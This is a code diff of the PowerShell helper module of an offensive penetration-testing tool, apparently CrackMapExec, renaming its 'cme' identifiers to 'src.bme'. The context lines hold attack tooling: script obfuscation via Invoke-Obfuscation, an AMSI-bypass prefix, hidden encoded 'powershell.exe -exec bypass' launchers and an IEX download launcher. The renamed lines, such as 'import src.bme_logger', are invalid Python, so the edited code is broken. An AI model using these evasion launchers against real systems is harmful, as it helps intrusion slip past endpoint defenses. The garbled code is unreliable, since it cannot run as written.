@@ -6,9 +6,9 @@ from sys import exit
 from string import ascii_lowercase
 from random import choice, sample
 from subprocess import call
-from cme.helpers.misc import which
-from cme.logger import cme_logger
-from cme.paths import CME_PATH, DATA_PATH
+from src.bme.helpers.misc import which
+from src.bme.logger import src.bme_logger
+from src.bme.paths import src.bme_PATH, DATA_PATH
 from base64 import b64encode
 
 obfuscate_ps_scripts = False
@@ -30,24 +30,24 @@ def is_powershell_installed():
 
 def obfs_ps_script(path_to_script):
     ps_script = path_to_script.split("/")[-1]
-    obfs_script_dir = os.path.join(CME_PATH, "obfuscated_scripts")
+    obfs_script_dir = os.path.join(src.bme_PATH, "obfuscated_scripts")
     obfs_ps_script = os.path.join(obfs_script_dir, ps_script)
 
     if is_powershell_installed() and obfuscate_ps_scripts:
         if os.path.exists(obfs_ps_script):
-            cme_logger.display("Using cached obfuscated Powershell script")
+            src.bme_logger.display("Using cached obfuscated Powershell script")
             with open(obfs_ps_script, "r") as script:
                 return script.read()
 
-        cme_logger.display("Performing one-time script obfuscation, go look at some memes cause this can take a bit...")
+        src.bme_logger.display("Performing one-time script obfuscation, go look at some memes cause this can take a bit...")
 
         invoke_obfs_command = f"powershell -C 'Import-Module {get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1')};Invoke-Obfuscation -ScriptPath {get_ps_script(path_to_script)} -Command \"TOKEN,ALL,1,OUT {obfs_ps_script}\" -Quiet'"
-        cme_logger.debug(invoke_obfs_command)
+        src.bme_logger.debug(invoke_obfs_command)
 
         with open(os.devnull, "w") as devnull:
             return_code = call(invoke_obfs_command, stdout=devnull, stderr=devnull, shell=True)
 
-        cme_logger.success("Script obfuscated successfully")
+        src.bme_logger.success("Script obfuscated successfully")
 
         with open(obfs_ps_script, "r") as script:
             return script.read()
@@ -108,7 +108,7 @@ else
     else:
         command = amsi_bypass + ps_command
 
-    cme_logger.debug("Generated PS command:\n {}\n".format(command))
+    src.bme_logger.debug("Generated PS command:\n {}\n".format(command))
 
     # We could obfuscate the initial launcher using Invoke-Obfuscation but because this function gets executed
     # concurrently it would spawn a local powershell process per host which isn't ideal, until I figure out a good way
@@ -118,7 +118,7 @@ else
     """
     if is_powershell_installed():
 
-        temp = tempfile.NamedTemporaryFile(prefix='cme_',
+        temp = tempfile.NamedTemporaryFile(prefix='src.bme_',
                                            suffix='.ps1',
                                            dir='/tmp')
         temp.write(command)
@@ -130,11 +130,11 @@ else
             invoke_obfs_command = 'powershell -C \'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command "ENCODING,{}" -Quiet\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),
                                                                                                                                               temp.name,
                                                                                                                                               encoding)
-            cme_logger.debug(invoke_obfs_command)
+            src.bme_logger.debug(invoke_obfs_command)
             out = check_output(invoke_obfs_command, shell=True).split('\n')[4].strip()
 
             command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "{}"'.format(out)
-            cme_logger.debug('Command length: {}'.format(len(command)))
+            src.bme_logger.debug('Command length: {}'.format(len(command)))
 
             if len(command) <= 8192:
                 temp.close()
@@ -152,14 +152,14 @@ else
                 break
 
             if obfs_attempts == 4:
-                cme_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
+                src.bme_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
                 exit(1)
 
             obfs_attempts += 1
     else:
         command = f"powershell.exe -noni -nop -w 1 -enc {encode_ps_command(command)}"
         if len(command) > 8191:
-            cme_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
+            src.bme_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
             exit(1)
 
     return command
@@ -253,7 +253,7 @@ $request.GetResponse()""".format(
             command=command,
         )
 
-    cme_logger.debug(f"Generated PS IEX Launcher:\n {launcher}\n")
+    src.bme_logger.debug(f"Generated PS IEX Launcher:\n {launcher}\n")
 
     return launcher.strip()
 
